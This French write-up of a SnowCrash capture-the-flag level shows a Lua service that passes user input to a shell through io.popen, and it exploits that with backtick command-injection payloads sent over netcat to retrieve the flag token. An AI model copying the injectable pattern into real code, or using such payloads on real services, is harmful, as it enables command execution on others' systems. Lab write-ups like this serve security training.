On trouve dans le dossier home un file **level11.lua** qui contient:

```lua
#!/usr/bin/env lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 5151))

function hash(pass)
	prog = io.popen("echo "..pass.." | sha1sum", "r")
	data = prog:read("*all")
	prog:close()
	data = string.sub(data, 1, 40)
	return data
end

while 1 do
	local client = server:accept()
	client:send("Password: ")
	client:settimeout(60)
	local l, err = client:receive()
	if not err then
		print("trying " .. l)
		local h = hash(l)
		if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
			client:send("Erf nope..\n");
		else
			client:send("Gz you dumb*\n")
		end
	end
	client:close()
end
```

On abserve que le programme est lancé sur **127.0.0.1:5151**, donc pour pouvoir interagir avec on utilise:
<pre><code>> nc 127.0.0.1 5151
Password:
Erf nope..</code></pre>

En regardant le programme de plus pres, on se rend compte qu'une injection est possible <code>io.popen("echo "..pass.." | sha1sum", "r")</code> car il execute la varibale pass, qui est notre input.
De plus la deuxieme partie du code ne sert a rien cart même un a message peut importe le mot de passe
> Le bon mot de passe est: **NotSoEasy** (rajouter un -n devant pour que cela fonctionne)

On essaye :
<pre><code>> nc 127.0.0.1 5151
Password: `whoami > /tmp/test`
Erf nope..
level11@SnowCrash:~$ cat /tmp/test
flag11
</code></pre>
> On stocke le resultat dans un fichier car sinon il n'y a pas d'affichage car il ne s'agit pas d'un <code>client:send()</code>

<pre><code>> nc 127.0.0.1 5151
Password: `getflag > /tmp/test`
Erf nope..
level11@SnowCrash:~$ cat /tmp/test
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
</code></pre>

<pre>
<code>> getflag</code>
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
</pre>